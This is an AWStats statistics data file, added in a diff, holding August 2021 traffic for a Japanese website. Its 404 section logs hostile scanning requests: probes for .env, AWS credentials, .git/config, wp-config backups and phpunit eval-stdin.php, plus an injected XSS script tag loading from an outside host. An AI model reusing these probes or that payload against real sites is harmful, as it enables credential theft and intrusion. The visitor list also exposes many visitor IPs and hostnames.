@@ -1,0 +1,792 @@
+AWSTATS DATA FILE 6.0 (build 1.696)
+# If you remove this file, all statistics for date 2021-08 will be lost/reset.
+
+# Position (offset in bytes) in this file of beginning of each section for
+# direct I/O access. If you made changes somewhere in this file, you should
+# also remove completely the MAP section (AWStats will rewrite it at next
+# update).
+BEGIN_MAP 27
+POS_GENERAL 1837                
+POS_TIME 2480                
+POS_VISITOR 12486               
+POS_DAY 28039               
+POS_DOMAIN 3315                
+POS_LOGIN 3832                
+POS_ROBOT 3987                
+POS_WORMS 4267                
+POS_EMAILSENDER 4398                
+POS_EMAILRECEIVER 4541                
+POS_SESSION 28706               
+POS_SIDER 28908               
+POS_FILETYPES 4676                
+POS_OS 4840                
+POS_BROWSER 4950                
+POS_SCREENSIZE 5083                
+POS_UNKNOWNREFERER 5157                
+POS_UNKNOWNREFERERBROWSER 6381                
+POS_ORIGIN 7081                
+POS_SEREFERRALS 7224                
+POS_PAGEREFS 7381                
+POS_SEARCHWORDS 7903                
+POS_KEYWORDS 8055                
+POS_MISC 2170                
+POS_ERRORS 8114                
+POS_CLUSTER 3688                
+POS_SIDER_404 8258                
+END_MAP
+
+# LastLine    = Date of last record processed - Last record line number in last log - Last record offset in last log - Last record signature value
+# FirstTime   = Date of first visit for history file
+# LastTime    = Date of last visit for history file
+# LastUpdate  = Date of last update - Nb of parsed records - Nb of old records - Nb of new records - Nb of corrupted - Nb of dropped
+# TotalVisits = Number of visits
+# TotalUnique = Number of unique visitors
+# MonthHostsKnown   = Number of hosts known
+# MonthHostsUnKnown = Number of hosts unknown
+BEGIN_GENERAL 8
+LastLine 20210824235954 386 88589 0
+FirstTime 20210801003534
+LastTime 20210824223541
+LastUpdate 20210825010337 386 0 376 3 7
+TotalVisits 623                 
+TotalUnique 291                 
+MonthHostsKnown 199                 
+MonthHostsUnknown 99                  
+END_GENERAL
+
+# Misc ID - Pages - Hits - Bandwidth
+BEGIN_MISC 9
+RealPlayerSupport 0 0 0
+PDFSupport 0 0 0
+JavaEnabled 0 0 0
+FlashSupport 0 0 0
+QuickTimeSupport 0 0 0
+AddToFavourites 0 0 0
+WindowsMediaPlayerSupport 0 0 0
+DirectorSupport 0 0 0
+TotalMisc 0 0 0
+END_MISC
+
+# Hour - Pages - Hits - Bandwidth - Not viewed Pages - Not viewed Hits - Not viewed Bandwidth
+BEGIN_TIME 24
+0 24 24 130304 119 123 528309
+1 23 29 103703 88 88 55762
+2 20 23 131951 92 97 175498
+3 22 23 123968 64 65 41375
+4 34 39 235476 71 73 35274
+5 43 49 530557 97 97 36027
+6 28 31 157338 104 113 52880
+7 38 38 207735 102 110 54323
+8 33 57 2696141 64 66 39870
+9 39 56 247295 186 187 185088
+10 35 40 243407 96 102 160558
+11 53 66 514209 102 105 471549
+12 30 40 1636400 220 223 191832
+13 29 49 3108496 101 104 45067
+14 47 90 6073176 89 90 39856
+15 51 67 1747561 212 219 80236
+16 48 71 2905435 112 113 38710
+17 27 31 158467 197 309 81208
+18 45 72 2795754 174 176 59670
+19 20 24 587368 75 76 20888
+20 61 138 7822110 100 102 37151
+21 36 49 1452548 66 67 43356
+22 33 34 143030 101 102 35394
+23 29 30 159288 210 215 116048
+END_TIME
+
+# Domain - Pages - Hits - Bandwidth
+# The 10 first Pages must be first (order not required for others)
+BEGIN_DOMAIN 20
+com 363 427 3722816
+ip 196 228 5287145
+org 135 135 487285
+jp 96 303 21448045
+net 26 35 1456562
+io 4 4 44900
+cloud 4 4 44900
+us 3 3 23898
+ro 3 3 23898
+xyz 3 3 33675
+eu 1 1 3495
+ru 2 11 1269109
+host 1 1 3495
+arpa 2 2 22450
+ninja 2 3 7849
+de 2 2 6990
+tech 2 2 6990
+website 1 1 11225
+dev 1 1 3495
+tr 1 1 3495
+END_DOMAIN
+
+# Cluster ID - Pages - Hits - Bandwidth
+BEGIN_CLUSTER 0
+END_CLUSTER
+
+# Login - Pages - Hits - Bandwidth - Last visit
+# The 10 first Pages must be first (order not required for others)
+BEGIN_LOGIN 0
+END_LOGIN
+
+# Robot ID - Hits - Bandwidth - Last visit - Hits on robots.txt
+# The 10 first Hits must be first (order not required for others)
+BEGIN_ROBOT 4
+googlebot 129 1809232 20210820013816 0 
+python 22 76890 20210823234246 0 
+baiduspider 20 69900 20210824043823 0 
+netcraft 3 33675 20210806031536 0 
+END_ROBOT
+
+# Worm ID - Hits - Bandwidth - Last visit
+# The 5 first Hits must be first (order not required for others)
+BEGIN_WORMS 0
+END_WORMS
+
+# EMail - Hits - Bandwidth - Last visit
+# The 20 first Hits must be first (order not required for others)
+BEGIN_EMAILSENDER 0
+END_EMAILSENDER
+
+# EMail - Hits - Bandwidth - Last visit
+# The 20 first hits must be first (order not required for others)
+BEGIN_EMAILRECEIVER 0
+END_EMAILRECEIVER
+
+# Files type - Hits - Bandwidth - Bandwidth without compression - Bandwidth after compression
+BEGIN_FILETYPES 6
+png 123 18909589 0 0
+css 82 253685 0 0
+jpg 50 10161663 0 0
+php 198 1024196 0 0
+html 650 3504759 0 0
+js 67 57825 0 0
+END_FILETYPES
+
+# OS ID - Hits
+BEGIN_OS 7
+openbsd 1
+winnt 527
+macosx 180
+Unknown 351
+winlong 9
+winxp 1
+linux 101
+END_OS
+
+# Browser ID - Hits
+BEGIN_BROWSER 8
+opera 2
+curl 4
+msie9.0 4
+Unknown 68
+netscape5.0 26
+safari 749
+mozilla 314
+libwww 3
+END_BROWSER
+
+# Screen size - Hits
+BEGIN_SCREENSIZE 0
+END_SCREENSIZE
+
+# Unknown referer OS - Last visit date
+BEGIN_UNKNOWNREFERER 22
+Mozilla/5.0 20210823234838
+Mozilla/5.0_(compatible;_SemrushBot/7~bl;__http://www.semrush.com/bot.html) 20210824223541
+https://gdnplus.com:Gather_Analyze_Provide. 20210821072730
+NetSystemsResearch_studies_the_availability_of_various_services_across_the_internet._Our_website_is_netsystemsresearch.com 20210818022009
+masscan-ng/1.3_(https://github.com/bi-zone/masscan-ng) 20210813070831
+libwww-perl/6.54 20210802190456
+Mozilla/5.0_(compatible;_bingbot/2.0;__http://www.bing.com/bingbot.htm) 20210824211517
+libwww-perl/6.05 20210822092557
+Mozilla/5.0_(compatible;_Google-Site-Verification/1.0) 20210812152211
+Go-http-client/1.1 20210819154519
+fasthttp 20210803155450
+l9tcpid/v1.1.0 20210815161314
+httpx_-_Open-source_project_(github.com/projectdiscovery/httpx) 20210811052814
+Go_http_package 20210824175718
+colly_-_https://github.com/gocolly/colly/v2 20210819051829
+curl/7.67.0 20210814060228
+Mozilla/5.0_zgrab/0.x 20210819223019
+- 20210824180058
+curl/7.75.0 20210822023334
+curl/7.29.0 20210820010457
+Mozilla/5.0_(compatible;_CensysInspect/1.1;__https://about.censys.io/) 20210824181055
+Mozilla/5.0_(compatible;_Wappalyzer) 20210810162201
+END_UNKNOWNREFERER
+
+# Unknown referer Browser - Last visit date
+BEGIN_UNKNOWNREFERERBROWSER 11
+httpx_-_Open-source_project_(github.com/projectdiscovery/httpx) 20210811052814
+l9tcpid/v1.1.0 20210815161314
+https://gdnplus.com:Gather_Analyze_Provide. 20210821072730
+colly_-_https://github.com/gocolly/colly/v2 20210819051829
+Go_http_package 20210824175718
+NetSystemsResearch_studies_the_availability_of_various_services_across_the_internet._Our_website_is_netsystemsresearch.com 20210818022009
+Dalvik/2.1.0_(Linux;_U;_Android_7.0;_ZTE_BA520_Build/MRA58K) 20210822055153
+fasthttp 20210803155450
+Go-http-client/1.1 20210819154519
+masscan-ng/1.3_(https://github.com/bi-zone/masscan-ng) 20210813070831
+- 20210824180058
+END_UNKNOWNREFERERBROWSER
+
+# Origin - Pages - Hits 
+BEGIN_ORIGIN 6
+From0 600 655
+From1 0 0
+From2 14 14
+From3 93 103
+From4 141 398
+From5 0 0
+END_ORIGIN
+
+# Search engine referers ID - Pages - Hits
+BEGIN_SEREFERRALS 1
+google 14 14
+END_SEREFERRALS
+
+# External page referers - Pages - Hits
+# The 10 first Pages must be first (order not required for others)
+BEGIN_PAGEREFS 10
+http://150.60.231.106 54 54
+http://150.60.231.106:80 23 23
+http://150.60.231.106/index.php 8 8
+https://app.ferret-one.com/sites/c20122522665/pages/6074ef89b8726c667e32ddce 3 3
+http://150.60.231.106 2 2
+https://app.ferret-one.com 1 1
+http://150.60.231.106:80 1 1
+https://ap8.lightning.force.com 1 1
+https://150.60.231.106/common/css/style.css 0 1
+https://150.60.231.106 0 9
+END_PAGEREFS
+
+# Search keyphrases - Number of search
+# The 10 first number of search must be first (order not required for others)
+BEGIN_SEARCHWORDS 0
+END_SEARCHWORDS
+
+# Search keywords - Number of search
+# The 10 first number of search must be first (order not required for others)
+BEGIN_KEYWORDS 0
+END_KEYWORDS
+
+# Errors - Hits - Bandwidth
+BEGIN_ERRORS 5
+403 93 45597
+404 548 107408
+400 260 70849
+206 1 3495
+302 1946 408883
+END_ERRORS
+
+# URL with 404 errors - Hits - Last URL referer
+BEGIN_SIDER_404 137
+//blog/wp-includes/wlwmanifest.xml 6 -
+/thinkphp/html/public/index.php 3 http://150.60.231.106/thinkphp/html/public/index.php
+/manual 2 -
+/wp-config_good 1 http://sapocup.jp/wp-config_good
+/nmaplowercheck1628580105 1 -
+/2030059 4 -
+/depositapplication 1 -
+/.env.bak 1 -
+/help/ch_gb/images/help-title.gif 1 -
+/ckfinder/core/connector/php/connector.php 1 -
+/v1/ 1 -
+/googleef4423b7e3e04098.html 2 -
+/wp-config-backup.txt 1 http://sapocup.jp/wp-config-backup.txt
+/sitemap.xml 8 -
+/bak/ 1 -
+/streaming/clients_live.php 6 -
+//website/wp-includes/wlwmanifest.xml 6 -
+/nice%20ports%2C/Tri%6Eity.txt%2ebak 1 -
+/HNAP1 4 -
+/backup/ 1 -
+/evox/about 3 -
+//shop/wp-includes/wlwmanifest.xml 4 -
+/2019/ 1 -
+/elrekt.php 3 http://150.60.231.106/elrekt.php
+/owa/ 1 -
+/aws.yml 1 -
+/robots.txt 135 -
+/dev/ 1 -
+/wp-login.php 13 http://sapocup.jp/wp-login.php
+//level/15/exec/-/sh/run/CR 1 -
+/client 1 -
+/wp-content/ 1 -
+/telescope/requests 1 -
+/site/ 1 -
+//wp-includes/wlwmanifest.xml 6 -
+/wp/ 1 -
+/stalker_portal/c/version.js 6 -
+/.git/config 6 -
+/phpinfo.php 1 -
+/demo/ 1 -
+/api/v1 1 -
+//a2billing/customer/templates/default/footer.tpl 5 -
+//wp2/wp-includes/wlwmanifest.xml 6 -
+/google7657cb8c7a732cf6.html 2 -
+/html/public/index.php 3 http://150.60.231.106/html/public/index.php
+/2064028 2 -
+/bk/ 1 -
+/config/aws.yml 1 -
+/new/ 1 -
+/wp-config.php.swn 1 http://sapocup.jp/wp-config.php.swn
+/phpinfo 1 -
+/cgi-bin/config.exp 2 -
+//news/wp-includes/wlwmanifest.xml 6 -
+/wp2/ 1 -
+/TP/index.php 3 http://150.60.231.106/TP/index.php
+/login 1 -
+//sito/wp-includes/wlwmanifest.xml 6 -
+/cms/ 1 -
+/2064103 2 -
+/2020/ 1 -
+/owa/auth.owa 1 -
+/recordings/theme/main.css 2 -
+/new-site/ 1 -
+/t3 1 -
+/phpmyadmin/index.php 6 http://150.60.231.106/phpmyadmin/index.php
+//web/wp-includes/wlwmanifest.xml 6 -
+/.well-known/security.txt 3 -
+/tmp/ 1 -
+/public/index.php 3 http://150.60.231.106/public/index.php
+/%22%3E%3Cscript%20src%3Dhttps%3A%2F%2Fzd4life.xss.ht%3Ehttp://150.60.231.106%3C%2Fscript%3E 1 \"><script%20src=https://zd4life.xss.ht/http://150.60.231.106></script>
+/wp-admin/css/ 1 binance.com
+/wordpress/ 1 -
+/static/config/static_js.php 1 -
+/c/version.js 6 -
+/solr/ 2 http://150.60.231.106/solr/#/
+/old-site/ 1 -
+/tersm.php 1 -
+/wp1/ 1 -
+//xmlrpc.php 6 -
+/_profiler/phpinfo 1 -
+/main/ 1 -
+/_ignition/execute-solution 4 -
+/old/ 1 -
+/install/ 1 -
+/.env 55 -
+/wp-config.php.txt 1 http://sapocup.jp/wp-config.php.txt
+/aaa9 4 -
+/nmaplowercheck1629567471 1 -
+/v2/ 1 -
+/old-wp/ 1 -
+/aab9 4 -
+/common/js/footerfixed.js 3 -
+/nmaplowercheck1629431130 1 -
+/phpmyadmin4.8.5/index.php 4 http://150.60.231.106/phpmyadmin4.8.5/index.php
+/help/user/index.html 1 -
+/2023591 2 -
+/TP/html/public/index.php 3 http://150.60.231.106/TP/html/public/index.php
+/help/en/h_authenticate.html 1 -
+//media/wp-includes/wlwmanifest.xml 4 -
+//test/wp-includes/wlwmanifest.xml 6 -
+/wp-config.php_ 1 http://sapocup.jp/wp-config.php_
+/system_api.php 6 -
+/temp/ 1 -
+/owa/auth/logon.aspx 7 -
+/quotation 1 -
+/js/ckfinder/core/connector/php/connector.php 1 -
+//wordpress/wp-includes/wlwmanifest.xml 6 -
+/.DS_Store 1 -
+/nmaplowercheck1629105932 1 -
+/404 2 -
+/.aws/credentials 1 -
+/Telerik.Web.UI.WebResource.axd 4 http://150.60.231.106/Telerik.Web.UI.WebResource.axd
+/remote/login 2 -
+/sdk 4 -
+/xmlrpc.php 9 -
+/stream/live.php 6 -
+/invoice 1 -
+//2019/wp-includes/wlwmanifest.xml 4 -
+//site/wp-includes/wlwmanifest.xml 6 -
+/blog/ 1 -
+/webfig/ 2 http://150.60.231.106/webfig/
+/pmd/index.php 6 -
+/2018/ 1 -
+/web/ 1 -
+/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 2 http://150.60.231.106:80/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+/login/Jeecms.do 1 -
+//wp/wp-includes/wlwmanifest.xml 6 -
+/TP/public/index.php 3 http://150.60.231.106/TP/public/index.php
+//cms/wp-includes/wlwmanifest.xml 6 -
+/flu/403.html 6 -
+//wp1/wp-includes/wlwmanifest.xml 6 -
+/2046798 2 -
+//2018/wp-includes/wlwmanifest.xml 4 -
+/info.php 1 -
+/wp-includes 2 www.google.com
+/home/ 1 -
+/customerdata 1 -
+END_SIDER_404
+
+# Host - Pages - Hits - Bandwidth - Last visit date - [Start of last visit date] - [Last page of last visit]
+# [Start of last visit date] and [Last page of last visit] are saved only if session is not finished
+# The 10 first Hits must be first (order not required for others)
+BEGIN_VISITOR 298
+msnbot-207-46-13-98.search.msn.com 49 52 195024 20210812062338
+msnbot-207-46-13-85.search.msn.com 48 53 194239 20210824211517
+113x43x105x122.ap113.ftth.ucom.ne.jp 42 99 4049267 20210823142922
+m111237087057.v4.enabler.ne.jp 35 80 4427567 20210824184323
+msnbot-40-77-167-71.search.msn.com 19 20 210951 20210823160441
+ec2-34-229-215-204.compute-1.amazonaws.com 18 18 194320 20210816160653
+msnbot-207-46-13-155.search.msn.com 16 18 604542 20210816061543
+zl-dal-us-gp3-wk109.internet-census.org 15 15 52425 20210818080058
+zl-lax-us-gp3-wk105a.internet-census.org 12 12 41940 20210822125914
+zl-ams-nl-gp3-wk101a.internet-census.org 11 11 38445 20210823213906
+server.cyberghost.ro 3 3 23898 20210810215520
+ec2-35-171-25-154.compute-1.amazonaws.com 1 1 11225 20210816155024
+61-108-158-51.instances.scw.cloud 1 1 11225 20210808152152
+113x35x251x98.ap113.ftth.ucom.ne.jp 1 1 3495 20210820010457
+scanner-06.ch1.censys-scanner.com 5 5 32935 20210819211845
+zl-ams-nl-gp1-wk130.internet-census.org 1 1 3495 20210814174406
+cache.google.com 1 5 238473 20210819201957
+scanner-09.ch1.censys-scanner.com 4 4 21710 20210822034326
+20.80.6.251 1 1 3495 20210801051808
+216.250.249.114 2 2 6990 20210810181645
+zl-lax-us-gp3-wk111.internet-census.org 5 5 17475 20210822204444
+178.62.54.73 1 1 3495 20210806003151
+petalbot-114-119-139-212.petalsearch.com 4 4 9011 20210823021142
+37.120.154.98 1 10 1262873 20210819202421
+ac8ce.rederatural.com 1 1 11225 20210804234705
+45.33.35.225.li.binaryedge.ninja 2 3 7849 20210808111102
+ec2-54-175-231-42.compute-1.amazonaws.com 1 1 11225 20210819135524
+191.96.168.191 1 1 3495 20210817085109
+msnbot-207-46-13-48.search.msn.com 0 1 4091 
+137.184.27.123 1 1 3495 20210818033749
+ec2-13-57-28-191.us-west-1.compute.amazonaws.com 1 1 3495 20210823123155
+193.56.29.27 1 1 3495 20210811140114
+45.83.67.191 1 1 3495 20210818210913
+119.68.65.34.bc.googleusercontent.com 1 1 3495 20210802232558
+scan-03.shadowserver.org 1 1 11225 20210805133023
+msnbot-40-77-167-42.search.msn.com 0 1 1063 
+g148.61-193-222.ppp.wakwak.ne.jp 1 10 1262873 20210816162121
+64.62.197.212 1 1 11225 20210823121456
+164.52.24.162 2 2 22450 20210810123439
+104.41.150.213 2 2 22450 20210809000522
+185.210.217.9 3 3 23898 20210819233225
+139.196.217.76 1 1 3495 20210811051602
+smtp186.dyeclk.com 1 1 3495 20210818071641
+worker-01.sfj.censys-scanner.com 1 1 3495 20210803001542
+ec2-18-116-10-153.us-east-2.compute.amazonaws.com 1 1 3495 20210810222712
+mail16.mamaya.us 3 3 23898 20210824112909
+20.102.74.72 2 2 6990 20210823182725
+li282-54.members.linode.com 1 1 3495 20210820042104
+crawl7.bl.semrush.com 1 1 3495 20210824223541
+unn-156-146-35-50.cdn77.com 3 3 23898 20210802020506
+worker-07.sfj.censys-scanner.com 2 2 6990 20210817223051
+worker-08.sfj.censys-scanner.com 1 1 3495 20210817210037
+20.85.231.87 1 1 3495 20210815091443
+8.209.100.213 4 4 37170 20210822023818
+google-proxy-66-102-6-157.google.com 1 1 3495 20210802102122
+msnbot-207-46-13-75.search.msn.com 0 4 3436 
+ec2-52-205-164-73.compute-1.amazonaws.com 1 1 11225 20210817085246
+ip230.208-100-26.static.steadfastdns.net 4 4 33675 20210816182537
+p3025145-ipngn18501marunouchi.tokyo.ocn.ne.jp 3 17 318622 20210819234356
+li-syd-au-gd4-wk108.internet-census.org 1 1 3495 20210820185618
+ec2-35-162-157-3.us-west-2.compute.amazonaws.com 1 1 11225 20210814213652
+li-dal-us-gd4-wk103a.internet-census.org 1 1 3495 20210803203938
+61.147.15.67 4 4 13980 20210822055250
+google-proxy-64-233-173-113.google.com 4 4 13980 20210812152211
+185.173.35.57.netsystemsresearch.com 1 1 11225 20210818022009
+google-proxy-64-233-173-109.google.com 1 1 3495 20210812152122
+ip-103-149-192-138.v4.mbrg.tech 1 1 3495 20210803205545
+msnbot-40-77-189-154.search.msn.com 0 2 4447 
+ec2-18-209-98-88.compute-1.amazonaws.com 1 1 3495 20210806150659
+li1254-65.members.linode.com 1 1 3495 20210813114149
+172.93.163.126 6 6 20970 20210809071253
+170.130.187.14 1 1 11225 20210824175718
+37.120.235.168 2 2 17461 20210805000908
+64.62.197.92 3 3 33675 20210824134021
+ec2-54-91-91-237.compute-1.amazonaws.com 1 1 3495 20210824125240
+scanner-07.ch1.censys-scanner.com 3 3 10485 20210818150452
+81.69.191.124 1 1 3495 20210812151303
+188.166.9.139 1 1 3495 20210804205525
+183.136.226.3 7 7 47655 20210822170508
+103.155.82.112 1 1 3495 20210803134832
+google-proxy-64-233-173-111.google.com 3 3 10485 20210812152210
+ec2-3-95-29-187.compute-1.amazonaws.com 1 1 3495 20210812011348
+tor-exit-5.zbau.f3netze.de 1 1 3495 20210812034229
+45.129.18.220 1 1 0 20210820141639
+ec2-13-53-154-232.eu-north-1.compute.amazonaws.com 1 1 3495 20210812035841
+52.168.146.126 5 5 17475 20210821193104
+147.182.201.186 1 1 3495 20210813111909
+unn-37-19-223-224.datapacket.com 3 3 23898 20210823022740
+ec2-54-235-225-19.compute-1.amazonaws.com 1 1 11225 20210816140801
+unn-84-17-52-68.cdn77.com 3 3 23898 20210817040846
+162.62.117.51 1 1 0 20210802002423
+worker-02.sfj.censys-scanner.com 1 1 3495 20210810101447
+unn-156-146-35-21.cdn77.com 3 3 23898 20210817181500
+ec2-3-237-252-76.compute-1.amazonaws.com 1 1 3495 20210813123803
+li1270-27.members.linode.com 1 1 3495 20210806024143
+20.89.22.112 1 1 3495 20210819021240
+185.189.150.72 3 3 23898 20210807072050
+msnbot-157-55-39-83.search.msn.com 5 11 242862 20210814090313
+zl-lax-us-gp3-wk110.internet-census.org 8 8 27960 20210823031418
+77.247.110.91 1 1 3495 20210808220538
+scanner-05.ch1.censys-scanner.com 4 4 21710 20210824180059
+group-ib.ru 1 10 1262873 20210803155504
+92.118.161.29.netsystemsresearch.com 1 1 11225 20210822073652
+217.red-88-9-119.dynamicip.rima-tde.net 1 1 3495 20210815010222
+12.47.136.34.bc.googleusercontent.com 3 3 10681 20210821183023
+176.125.229.145 3 3 23898 20210806041821
+103.142.205.63 1 1 3495 20210814150958
+203.159.80.192 2 2 22450 20210809110033
+faheem.probe.onyphe.net 1 1 11225 20210806171048
+ec2-3-85-165-42.compute-1.amazonaws.com 9 9 93295 20210806200019
+scan035.intrinsec.com 3 3 33675 20210821094847
+39.103.162.225 4 4 13980 20210819154519
+136.144.41.6 1 1 3495 20210812160711
+199-148-172-163.instances.scw.cloud 1 1 11225 20210808060023
+zl-ams-nl-gp3-wk102a.internet-census.org 11 11 38445 20210822085152
+blue2.census.shodan.io 1 1 11225 20210817013900
+fatboy.wdmsh.net 2 2 6990 20210824044549
+195-246-120-157-static.serverhotell.net 3 3 23898 20210803105221
+p277007-ipoe.ipoe.ocn.ne.jp 4 22 2532736 20210820154115
+zl-dal-us-gd7-wk103.internet-census.org 1 1 3495 20210821004020
+191.101.217.68 3 3 23898 20210823093156
+google-proxy-66-102-6-59.google.com 1 1 3495 20210804095135
+ip-103-149-192-168.v4.mbrg.tech 1 1 3495 20210820070312
+ec2-54-203-73-198.us-west-2.compute.amazonaws.com 1 1 3495 20210804140900
+petalbot-114-119-139-217.petalsearch.com 1 1 13155 20210812152941
+msnbot-40-77-190-214.search.msn.com 0 3 5306 
+msnbot-40-77-167-5.search.msn.com 4 7 30093 20210811162237
+61.135.15.184 1 1 11225 20210801043449
+scanner-08.ch1.censys-scanner.com 1 1 3495 20210820001356
+unn-84-17-60-61.cdn77.com 3 3 23898 20210805122058
+scanner-27.ch1.censys-scanner.com 4 4 21710 20210824133702
+92.118.161.49.netsystemsresearch.com 1 1 11225 20210811163026
+191.101.217.67 3 3 23898 20210805033322
+143.198.78.84 1 1 11225 20210819175852
+5.8.10.202 1 1 11225 20210803155450
+optin.seponrap.com 3 3 23898 20210806114957
+ip22.ip-51-89-255.eu 1 1 3495 20210801093002
+ec2-44-242-172-162.us-west-2.compute.amazonaws.com 1 1 3495 20210809124409
+45.61.146.242 2 2 6990 20210811052814
+zx4.quadmetrics.com 4 4 13980 20210824083115
+195-246-120-179-static.serverhotell.net 6 6 47796 20210819071420
+gitswitch-build-environment.2600hz.com 2 2 6990 20210802145457
+121.5.113.11 3 3 10485 20210812172137
+78-128.206.104.serverhubrdns.in-addr.arpa 1 1 11225 20210821072730
+137.220.35.14.vultr.com 1 1 3495 20210810113533
+209.97.168.163 1 1 3495 20210809183043
+ec2-54-84-23-75.compute-1.amazonaws.com 1 1 3495 20210819041621
+nieve.probe.onyphe.net 1 1 11225 20210808213339
+smtp5.shbgura.xyz 3 3 33675 20210822200720
+tor-exit.r3.darknet.dev 1 1 3495 20210806140133
+petalbot-114-119-145-56.petalsearch.com 1 1 3651 20210809221038
+ppp91-76-188-69.pppoe.mtu-net.ru 1 1 6236 20210805080516
+msnbot-40-77-167-2.search.msn.com 4 4 13980 20210813081146
+91.241.19.182 2 2 22450 20210820212921
+static.71.51.21.65.clients.your-server.de 1 1 3495 20210815101828
+petalbot-114-119-139-205.petalsearch.com 2 2 5944 20210816062642
+msnbot-207-46-13-4.search.msn.com 3 4 6775 20210819122450
+188.43.136.32 2 22 2778459 20210819212252
+138.68.58.93 2 2 6990 20210805043836
+crawl2.bl.semrush.com 1 1 1912 20210808221504
+ec2-3-80-212-242.compute-1.amazonaws.com 1 1 3495 20210823122451
+petalbot-114-119-140-79.petalsearch.com 1 1 2363 20210810102801
+89.44.9.171 1 1 3495 20210823194416
+msnbot-207-46-13-135.search.msn.com 2 4 20451 20210813211536
+crawlers.projectlernaean.com 1 1 3495 20210819051829
+scanner26.about.spyse.com 1 1 11225 20210822142211
+zl-lax-us-gp3-wk112.internet-census.org 11 11 38445 20210824110851
+92.118.160.53.netsystemsresearch.com 1 1 11225 20210807170512
+petalbot-114-119-145-194.petalsearch.com 1 1 3495 20210809232745
+li-dal-us-gd4-wk106a.internet-census.org 4 4 13980 20210824172923
+zl-lax-us-gp3-wk106b.internet-census.org 8 8 27960 20210815212039
+ec2-34-216-206-248.us-west-2.compute.amazonaws.com 1 1 11225 20210820144231
+li1254-160.members.linode.com 1 1 3495 20210813124319
+109.248.6.120 1 1 11225 20210813070831
+petalbot-114-119-134-165.petalsearch.com 2 2 9251 20210811151158
+45.87.61.234 1 1 3495 20210808051438
+209.160.106.58 1 1 3495 20210818234442
+msnbot-40-77-190-86.search.msn.com 0 3 5306 
+223-30-0-0.lan.sify.net 2 2 6990 20210811205438
+manager.markahost.com.tr 1 1 3495 20210815001256
+unn-84-17-49-80.cdn77.com 3 3 23898 20210824121759
+zl-ams-nl-gd7-wk101.internet-census.org 3 3 10485 20210819201754
+221.74.30.125.dy.iij4u.or.jp 1 10 1262873 20210816135325
+52.114.14.71 1 1 2293 20210819202425
+64.62.197.62 2 2 22450 20210813105212
+40.87.45.11 1 1 3495 20210803133627
+195.225.118.37 3 3 23898 20210802053007
+188.126.73.202 3 3 23898 20210802073150
+185.32.222.5 3 3 23898 20210823143234
+172.93.163.127 3 3 10485 20210808184045
+40.122.104.79 2 2 22450 20210814185521
+ec2-54-218-247-107.us-west-2.compute.amazonaws.com 1 1 11225 20210817234029
+msnbot-207-46-13-30.search.msn.com 0 4 121819 
+fs9f1c4406.tkyc511.ap.nuro.jp 2 12 1269257 20210817200728
+unn-195-181-161-2.datapacket.com 3 3 23898 20210806082801
+zl-dal-us-gd7-wk104.internet-census.org 3 3 10485 20210813012624
+207.246.101.144.vultr.com 1 1 3495 20210817190037
+64.225.104.79 1 1 11225 20210814060228
+60.217.75.69 6 6 20970 20210823234838
+msnbot-207-46-13-89.search.msn.com 5 7 15413 20210819225102
+45.83.64.220 1 1 3495 20210804114622
+52.162.161.148 2 2 29982 20210824190714
+132.226.212.242 4 4 13980 20210802233520
+199.180.151.153.ap.dti.ne.jp 1 1 3495 20210823112906
+petalbot-114-119-139-202.petalsearch.com 3 3 8966 20210822155721
+120.48.25.231 3 3 10485 20210813233949
+5.227.5.125 2 2 17461 20210821034014
+57.97.70.34.bc.googleusercontent.com 1 1 3495 20210810074641
+185.173.35.17.netsystemsresearch.com 1 1 11225 20210801040120
+146.70.8.5 3 3 23898 20210805103405
+sh-ams-nl-gp1-wk116.internet-census.org 1 1 3495 20210805110756
+198.199.73.62 1 1 3495 20210820205850
+8.209.100.236 1 1 3495 20210820125241
+47.241.232.45 2 2 14720 20210820124603
+3-109-158-51.instances.scw.cloud 1 1 11225 20210806114555
+47.243.119.25 1 1 3495 20210822023334
+zl-ams-nl-gd7-wk102.internet-census.org 3 3 10485 20210820222859
+probe-nl001.rand0.leakix.org 1 1 11225 20210815161314
+246-195-15-51.instances.scw.cloud 1 1 11225 20210812044451
+mint1.noc40.com 2 2 6990 20210818132912
+104.44.132.101 2 2 22450 20210815183838
+185.32.222.13 3 3 23898 20210818083713
+bea1a3l.beastone.website 1 1 11225 20210803154205
+185.32.222.120 3 3 23898 20210806062524
+hypi.idianrunner.com 3 3 23898 20210815131910
+vmi539199.contaboserver.net 1 1 11225 20210802190456
+45.129.18.134 1 1 0 20210823051346
+45.129.18.222 1 1 0 20210811060339
+125x102x254x178.ap125.ftth.ucom.ne.jp 3 21 2529241 20210819135337
+msnbot-207-46-13-11.search.msn.com 2 4 448929 20210824045651
+185.173.35.21.netsystemsresearch.com 1 1 11225 20210807045936
+li-syd-au-gd4-wk107.internet-census.org 2 2 6990 20210805082246
+43.139.65.34.bc.googleusercontent.com 1 1 3495 20210814052831
+iclnm.worlpeed.net 1 1 3495 20210813012849
+li-lon-uk-gd4-wk104a.internet-census.org 2 2 6990 20210824024808
+scanner-26.ch1.censys-scanner.com 5 5 32935 20210819101444
+mx91.malayasaltern.com 1 1 3495 20210816130036
+20.55.75.76 3 3 25945 20210811152010
+vmi641187.contaboserver.net 2 2 22450 20210822092557
+167.99.120.2 1 1 3495 20210810094033
+ajplumbing.tempurl.host 1 1 3495 20210803205820
+scanner-25.ch1.censys-scanner.com 1 1 3495 20210816053704
+185.220.101.12 1 1 3495 20210804081354
+msnbot-207-46-13-26.search.msn.com 2 2 3824 20210803034131
+petalbot-114-119-139-186.petalsearch.com 1 1 7431 20210817095830
+103.151.123.125 2 2 6990 20210821182036
+crawl39.bl.semrush.com 1 1 3651 20210803183424
+165.227.7.53 2 2 6990 20210816071643
+google-proxy-66-249-93-175.google.com 1 1 3495 20210812152211
+52.114.128.37 1 1 3495 20210819211438
+64.62.197.32 3 3 33675 20210822143618
+27.115.124.37 1 1 11225 20210806060150
+m106072132225.v4.enabler.ne.jp 1 10 1262873 20210803204313
+unknown.puregig.net 1 1 11225 20210808053014
+li-atl-us-gd4-wk102a.internet-census.org 2 2 6990 20210805032655
+petalbot-114-119-139-201.petalsearch.com 1 1 1992 20210815010656
+198.204.234.252 3 3 10485 20210822224928
+scanner-04.ch1.censys-scanner.com 5 5 25205 20210824181055
+ec2-54-162-109-194.compute-1.amazonaws.com 7 7 70845 20210823112430
+msnbot-157-55-39-161.search.msn.com 1 3 8477 20210801023559
+kd059138172015.ppp-bb.dion.ne.jp 1 10 1262873 20210809084119
